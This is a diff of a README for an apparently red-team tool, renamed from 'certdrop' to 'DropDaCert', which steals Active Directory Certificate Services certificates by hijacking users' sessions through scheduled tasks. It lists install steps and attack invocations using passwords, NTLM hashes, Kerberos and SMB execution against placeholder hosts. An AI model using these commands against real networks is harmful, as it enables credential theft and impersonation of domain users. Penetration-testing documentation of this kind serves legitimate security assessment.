@@ -1,4 +1,4 @@
-# certdrop
+# DropDaCert
 
 ADCS certificate theft via scheduled task session hijacking.
 
@@ -7,7 +7,7 @@ Drops a scheduled task on a target that runs in an active user's session context
 ## Install
 
 ```bash
-git clone https://github.com/mattmillen15/certdrop.git && cd certdrop
+git clone https://github.com/mattmillen15/DropDaCert.git && cd DropDaCert
 python3 -m venv venv && source venv/bin/activate
 pip install -r requirements.txt
 curl -sL https://raw.githubusercontent.com/sensepost/susinternals/main/psexecsvc.py -o psexecsvc.py
@@ -18,39 +18,39 @@ This installs [certipy](https://github.com/ly4k/Certipy) and [psexecsvc](https:/
 ## Usage
 
 ```
-certdrop [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
+dropdacert [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
 ```
 
 ### Examples
 
 ```bash
 # Password auth, interactive session picker
-certdrop administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+dropdacert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
 
 # Target a specific user
-certdrop administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith
+dropdacert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith
 
 # Domain auth
-certdrop corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+dropdacert corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
 
 # NTLM hash
-certdrop administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1
+dropdacert administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1
 
 # Kerberos
-certdrop corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
+dropdacert corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
 
 # Kerberos with ccache
 export KRB5CCNAME=admin.ccache
-certdrop corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
+dropdacert corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
 
 # SMB exec (no WinRM needed)
-certdrop admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
+dropdacert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
 
 # Manual mode — generate files and print instructions only
-certdrop admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
+dropdacert admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
 
 # Non-admin target (C:\Users\Public + cmd wrapper)
-certdrop admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
+dropdacert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
   --drop-dir 'C:\Users\Public' --exec-wrapper cmd
 ```
 
